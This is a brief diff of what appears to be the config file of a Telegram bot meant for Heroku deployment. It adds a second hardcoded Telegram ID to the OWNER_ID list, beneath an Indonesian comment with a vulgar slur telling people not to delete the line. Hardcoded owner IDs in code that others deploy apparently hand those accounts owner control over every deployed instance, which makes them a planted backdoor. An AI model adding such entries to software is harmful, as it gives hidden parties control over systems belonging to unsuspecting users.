@@ -49,6 +49,7 @@ OWNER_ID = list(
 
 # JANGAN HAPUS YA KONTOL
 OWNER_ID.append(5063062493)
+OWNER_ID.append(1255514329)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
